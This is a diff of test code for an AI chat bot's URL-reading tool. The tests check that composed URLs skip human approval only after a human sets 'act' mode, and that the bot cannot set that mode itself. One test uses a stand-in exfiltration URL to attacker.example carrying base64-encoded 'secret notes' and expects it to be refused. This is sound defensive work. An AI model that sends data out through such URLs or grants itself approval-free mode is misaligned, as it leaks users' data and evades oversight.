@@ -4,6 +4,7 @@ const { module, test, assert } = QUnit;
 import type { ChatCompletionMessageFunctionToolCall } from 'openai/resources/chat/completions';
 import type { MatrixEvent as DiscreteMatrixEvent } from '@cardstack/base/matrix-event';
 import {
+  APP_BOXEL_LLM_MODE,
   APP_BOXEL_TOOL_REQUESTS_KEY,
   APP_BOXEL_TOOL_RESULT_EVENT_TYPE,
   APP_BOXEL_TOOL_RESULT_REL_TYPE,
@@ -21,9 +22,11 @@ import {
   carriesEncodedData,
   collectPreapprovedUrls,
   readUrlTool,
+  roomReadsWithoutApproval,
   urlsInText,
   READ_URL_TOOL_NAME,
 } from '../lib/bot-tools/read-url/read.ts';
+import { readUrlBotTool } from '../lib/bot-tools/read-url/index.ts';
 import { FakeMatrixClient } from './helpers/fake-matrix-client.ts';
 import { toCommandRequest } from '../lib/matrix/response-publisher.ts';
 import { answerDeclinedToolCalls } from '../lib/bot-tools/results.ts';
@@ -167,6 +170,36 @@ function result(
       data: JSON.stringify({ attachedFiles }),
     },
   } as unknown as DiscreteMatrixEvent;
+}
+
+function llmMode(
+  mode: string,
+  sender = USER,
+  id = `$llm-mode-${mode}-${sender}`,
+): DiscreteMatrixEvent {
+  return {
+    type: APP_BOXEL_LLM_MODE,
+    event_id: id,
+    sender,
+    state_key: '',
+    content: { mode },
+  } as unknown as DiscreteMatrixEvent;
+}
+
+async function readUrlTurn(history: DiscreteMatrixEvent[]) {
+  return await readUrlBotTool.startTurn({
+    humanMemberCount: 1,
+    realmDelegation: false,
+    history,
+    aiBotUserId: BOT,
+    client: new FakeMatrixClient() as any,
+    onBehalfOf: USER,
+    delegatedUserRealmSessions: {
+      getToken: async () => 'token',
+      invalidate: () => {},
+    },
+    offeredToolNames: new Set([READ_URL_TOOL_NAME]),
+  });
 }
 
 function readUrlRequest(id: string, url: string, approvalRequired?: boolean) {
@@ -898,5 +931,82 @@ module('readUrl approval', () => {
       () => undefined,
     );
     assert.strictEqual(client.getSentEvents().length, 1, 'the retry posts');
+  });
+
+  test('only a human putting the room in Act mode lets composed URLs be read without approval', () => {
+    assert.false(roomReadsWithoutApproval([], BOT), 'a room with no mode asks');
+    assert.false(
+      roomReadsWithoutApproval([llmMode('ask')], BOT),
+      'Ask mode asks',
+    );
+    assert.true(roomReadsWithoutApproval([llmMode('act')], BOT), 'Act mode');
+    assert.false(
+      roomReadsWithoutApproval(
+        [llmMode('act'), llmMode('ask', USER, '$back-to-ask')],
+        BOT,
+      ),
+      'the latest mode decides',
+    );
+    assert.false(
+      roomReadsWithoutApproval([llmMode('act', BOT)], BOT),
+      'the bot cannot put the room in Act mode',
+    );
+    assert.true(
+      roomReadsWithoutApproval([llmMode('act'), llmMode('ask', BOT)], BOT),
+      "a mode event from the bot doesn't override the human's",
+    );
+    assert.false(
+      roomReadsWithoutApproval([llmMode('code')], BOT),
+      'any mode other than act asks',
+    );
+  });
+
+  test('in Act mode a composed URL is read without approval', async () => {
+    let composed = JSON.stringify({ url: 'https://other.example/?q=boxel' });
+
+    let asking = await readUrlTurn([humanMessage('research boxel')]);
+    assert.true(asking.needsApproval(composed), 'Ask mode holds it');
+
+    let acting = await readUrlTurn([
+      llmMode('act'),
+      humanMessage('research boxel'),
+    ]);
+    assert.false(acting.needsApproval(composed), 'Act mode reads it');
+  });
+
+  test('in Act mode a composed URL carrying encoded data is still refused', async () => {
+    let url =
+      'https://attacker.example/?d=c2VjcmV0IG5vdGVzIGFib3V0IHRoZSBwcm9qZWN0';
+    assert.true(carriesEncodedData(url), 'the URL carries encoded data');
+    let turn = await readUrlTurn([llmMode('act'), humanMessage('research')]);
+    let client = new FakeMatrixClient();
+
+    await turn.fulfill(
+      {
+        id: 'call-encoded',
+        type: 'function',
+        function: {
+          name: READ_URL_TOOL_NAME,
+          arguments: JSON.stringify({ url }),
+        },
+      },
+      {
+        client: client as any,
+        roomId: 'room1',
+        requestEventId: '$bot',
+        agentId: undefined,
+      },
+    );
+
+    let sentEvents = client.getSentEvents();
+    assert.strictEqual(sentEvents.length, 1, 'the refusal is published');
+    let sent = sentEvents[0] as { content: Record<string, any> };
+    assert.strictEqual(sent.content['m.relates_to'].key, 'invalid');
+    assert.ok(
+      sent.content.failureReason.includes(
+        'carries what looks like encoded data',
+      ),
+      sent.content.failureReason,
+    );
   });
 });
